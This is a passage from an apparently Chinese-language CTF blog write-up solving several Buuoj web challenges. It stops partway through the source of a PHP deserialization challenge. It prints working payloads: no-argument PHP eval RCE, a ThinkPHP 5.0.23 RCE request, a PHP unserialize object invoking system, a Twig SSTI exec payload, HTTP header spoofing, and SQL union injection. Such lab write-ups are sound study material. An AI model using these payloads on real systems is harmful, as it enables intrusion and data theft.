<img src="/article/Buuoj-WEB-Write-up/image-20201208203755631.png" class="" title="image-20201208203755631" loading="lazy">

<p>得到源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// echo $_GET['exp'];</span>
                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// highlight_file(__FILE__);</span>
<span class="token delimiter important">?></span></span>
</code></pre>

<p>很好，看到这个<code>&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]</code>妥妥的无参数RCE</p>
<p>过滤一堆</p>
<p>先扫当前目录</p>
<p>payload&#x3D;<code>./?exp=print_r(scandir(current(localeconv())));</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">localeconv<span class="token punctuation">(</span><span class="token punctuation">)</span>: 返回一包含本地数字及货币格式信息的数组。如下图
current<span class="token punctuation">(</span><span class="token punctuation">)</span>: 取数组中第一个元素，返回数组中的当前单元。
current<span class="token punctuation">(</span>localeconv<span class="token punctuation">(</span><span class="token punctuation">))</span>: 取符号.
scandir<span class="token punctuation">(</span><span class="token punctuation">)</span>: 扫描目录
scandir<span class="token punctuation">(</span>current<span class="token punctuation">(</span>localeconv<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span>： 等同于scandir<span class="token punctuation">(</span>.<span class="token punctuation">)</span>，即扫描当前目录
print_r<span class="token punctuation">(</span><span class="token punctuation">)</span>： 输出</code></pre>

<img src="/article/Buuoj-WEB-Write-up/image-20201208205457822.png" class="" title="image-20201208205457822" loading="lazy">
<p>localeconv()如图所示</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208205704606.png" class="" title="image-20201208205704606" loading="lazy">
<p>current(localeconv())取到了符号.</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208205956327.png" class="" title="image-20201208205956327" loading="lazy">

<p>发现了flag.php</p>
<p>下面要取flag.php中的内容，flag.php在倒数第二组</p>
<p>由于没有禁用session，利用session<del>（我最喜欢</del></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208210427209.png" class="" title="~" loading="lazy">

<p>其他方法</p>
<p>payload&#x3D;<code>./?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
<pre class="language-none"><code class="language-none">array_flip()： 交换数组的键和值
array_rand()： 从数组中随机取出一个或多个单元
readfile()： 读文件</code></pre>

<img src="/article/Buuoj-WEB-Write-up/image-20201208211502701.png" class="" title="image-20201208211502701" loading="lazy">

<p>有点小运气嗷，可以写脚本跑，反正随机嘛…概率问题</p>
<p>读源码方法</p>
<pre class="language-none"><code class="language-none">file_get_contents()： 本题被ban
view-source:
highlight_file()
show_source()
readfile()</code></pre>



<hr>
<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><h5 id="thinkphp5-0-23-远程代码执行-漏洞"><a href="#thinkphp5-0-23-远程代码执行-漏洞" class="headerlink" title="thinkphp5.0.23 远程代码执行 漏洞"></a>thinkphp5.0.23 远程代码执行 漏洞</h5><p>payload：</p>
<p>POST</p>
<pre class="language-none"><code class="language-none">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</code></pre>

<hr>
<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><img src="/article/Buuoj-WEB-Write-up/image-20201210190510038.png" class="" title="image-20201210190510038" loading="lazy">

<p>打开一会发现网页自动刷新了，抓包看看</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201210190602388.png" class="" title="image-20201210190602388" loading="lazy">

<p>自动刷新</p>
<pre class="language-none"><code class="language-none">setTimeout(&quot;document.form1.submit()&quot;,5000)</code></pre>

<p>怀疑调用函数，尝试传参</p>
<pre class="language-none"><code class="language-none">func&#x3D;file_get_contents&amp;p&#x3D;index.php</code></pre>

<p>得到源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"passthru"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_open"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"show_source"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"popen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dl"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"touch"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"array_map"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uasort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uksort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fopen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fwrite"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>分析发现禁用了不少函数，调用了<code>call_user_func()</code>函数，可能存在命令执行。</p>
<p><code>gettype()</code>函数限制执行后返回必须为String类型。</p>
<p>观察发现，本题只对传入参数进行一次waf，代码中还给了个类Test，类中调用<code>gettime()</code>函数不会被waf，于是可用序列化方法，将代码序列化传入，再反序列化执行命令。</p>
<p>尝试传参</p>
<pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre>

<img src="/article/Buuoj-WEB-Write-up/image-20201210191635044.png" class="" title="image-20201210191635044" loading="lazy">

<p>再扫根目录文件</p>
<pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls &#x2F;&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre>

<img src="/article/Buuoj-WEB-Write-up/image-20201210192034277.png" class="" title="image-20201210192034277" loading="lazy">

<p>根目录没发现flag，利用system来找一下，<code>find / -name fla*</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201210192305790.png" class="" title="image-20201210192305790" loading="lazy">

<p>发现了奇怪的东西，打开即为flag</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201210192428939.png" class="" title="image-20201210192428939" loading="lazy">

<p>payload：</p>
<pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat &#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre>



<hr>
<h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><h5 id="Http-Header"><a href="#Http-Header" class="headerlink" title="Http Header"></a>Http Header</h5><p>考验http请求头，打开随便登陆底部源码提示<code>&lt;!-- L0g1n.php --&gt;</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201210194805424.png" class="" title="image-20201210194805424" loading="lazy">

<ol>
<li>提示<code>Sorry, this site will be available after totally 99 years!</code></li>
</ol>
<p>修改Cookie中<code>time=9999999999</code></p>
<ol start="2">
<li>提示<code>Sorry, this site is only optimized for those who comes from localhost</code></li>
</ol>
<p>添加<code>X-Forwarded-For: 127.0.0.1</code></p>
<p>提示<code>Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive·</code></p>
<p>添加<code>Client-IP: 127.0.0.1</code></p>
<ol start="3">
<li>提示<code>Sorry, this site is only optimized for those who come from gem-love.com</code></li>
</ol>
<p>添加<code>Referer: gem-love.com</code></p>
<ol start="4">
<li>提示<code>Sorry, this site is only optimized for browsers that run on Commodo 64</code></li>
</ol>
<p>资料：科摩多64位安全浏览器的UA为 Commodore 64 </p>
<p>修改<code>User-Agent: Commodore 64</code></p>
<ol start="5">
<li>提示<code>Sorry, this site is only optimized for those whose email is root@gem-love.com</code></li>
</ol>
<p>添加<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code></p>
<ol start="6">
<li>提示<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code></li>
</ol>
<p>添加<code>Via: y1ng.vip</code></p>
<p>提示</p>
<pre class="language-none"><code class="language-none">Sorry, even you are good at http header, you&#39;re still not my admin.&lt;br&gt; Althoungh u found me, u still dont know where is flag 
&lt;!--&#123;一段base64编码&#125;--&gt;</code></pre>

<p>base64解码注释得flag，可能原题这边只是给下一题的方向，没有直接给flag，这边做题简单化了吧…</p>
<p>最终payload：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span> <span class="token operator">/</span>L0g1n<span class="token operator">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> node3<span class="token operator">.</span>buuoj<span class="token operator">.</span>cn<span class="token punctuation">:</span><span class="token number">26256</span>
Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>
User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Commodore <span class="token number">64</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>
Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate
Accept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>
Cookie<span class="token punctuation">:</span> UM_distinctid<span class="token operator">=</span><span class="token number">1762</span>cb225c986d<span class="token operator">-</span><span class="token number">0970</span>f0908a83e6<span class="token operator">-</span><span class="token number">3323766</span><span class="token operator">-</span><span class="token number">144000</span><span class="token operator">-</span><span class="token number">1762</span>cb225ca565<span class="token punctuation">;</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>qo3u19su6i7oha2lte6grem4t6<span class="token punctuation">;</span> time<span class="token operator">=</span><span class="token number">9999999999</span>
Connection<span class="token punctuation">:</span> close
<span class="token constant">X</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>
Client<span class="token operator">-</span><span class="token constant">IP</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>
Referer<span class="token punctuation">:</span> gem<span class="token operator">-</span>love<span class="token operator">.</span>com
From<span class="token punctuation">:</span> root@gem<span class="token operator">-</span>love<span class="token operator">.</span>com
Via<span class="token punctuation">:</span> y1ng<span class="token operator">.</span>vip</code></pre>

<img src="/article/Buuoj-WEB-Write-up/image-20201210195920865.png" class="" title="image-20201210195920865" loading="lazy">



<hr>
<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h5 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h5><img src="/article/Buuoj-WEB-Write-up/image-20201213144912657.png" class="" title="image-20201213144912657" loading="lazy">

<p>ID测试，不是SQL注入，测试<code>&#123;&#123;1+1&#125;&#125;</code></p>
<p>返回<code>2</code>，确认SSTI</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201213145018456.png" class="" title="image-20201213145018456" loading="lazy">

<p>根据流程，测试<code>&#123;&#123;2*'1'&#125;&#125;</code></p>
<p>输出<code>49</code></p>
<p>确认为Twig模板引擎</p>
<p>直接打Payload：</p>
<p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /f*")&#125;&#125;</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201213145633846.png" class="" title="image-20201213145633846" loading="lazy">



<hr>
<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>注册，登陆，尝试SSTI没有，最后在广告标题处发现SQL注入</p>
<p>过滤<code> </code>,<code>+</code>,<code>or</code>,<code>and</code>等</p>
<p>空格用<code>/**/</code>替换</p>
<p>尝试爆列数，好家伙，22列</p>
<pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;	</code></pre>

<p>回显点在2,3</p>
<p>查一下数据库名</p>
<pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre>

<img src="/article/Buuoj-WEB-Write-up/image-20201213173543614.png" class="" title="image-20201213173543614" loading="lazy">

<p>库名web1</p>
<p>因为ban了<code>or</code>,所以<code>information_schema</code>,这时有<code>mysql.innodb_table_stats</code>，mysql默认是关闭InnoDB存储引擎 ，仅 Mysql&gt;5.6.x 可使用</p>
<p><a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">mariadb链接</a></p>
<p>查表</p>
<pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre>

<img src="/article/Buuoj-WEB-Write-up/image-20201213173634852.png" class="" title="image-20201213173634852" loading="lazy">

<p>表名<code> FLAG_TABLE</code>,<code>news</code>,<code>users</code>,<code>gtid_slave_pos</code>,<code>ads</code>,<code>users </code></p>
<h5 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h5><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;a&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre>



<p>原型</p>
<pre class="language-none"><code class="language-none">1&#39;union select 1,(select group_concat(a) from(select 1,2,3 as a union select * from users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre>



<p>2处是回显点，所以对2出注入，首先联合查询</p>
<p>然后分析<code>(select group_concat(a) from(select 1,2,3 as a union select * from users)x)</code></p>
<p>确认users列在web1中，慢慢试，无列名注入表的列数不相同会报错，最后发现users里有三列 </p>
<p>采用的子查询的方式，子查询是将一个查询语句嵌套在另一个查询语句中，在特定的情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件。 </p>
<p><code>(select 1,2,3 as a union select * from users)</code></p>
<p>将users这个表里面的查询的结果提供给外部查询，同时把列名转换成a，直接<code>group_concat(a)</code>可得结果</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201213175809048.png" class="" title="image-20201213175809048" loading="lazy">



<hr>
<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>先上源码</p>
<pre class="language-php" data-language="php"><code class="language-php">Welcome to index.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//flag is in flag.php</span>
<span class="token comment">//WTF IS THIS?</span>
<span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span>
<span class="token comment">//And Crack It!</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>
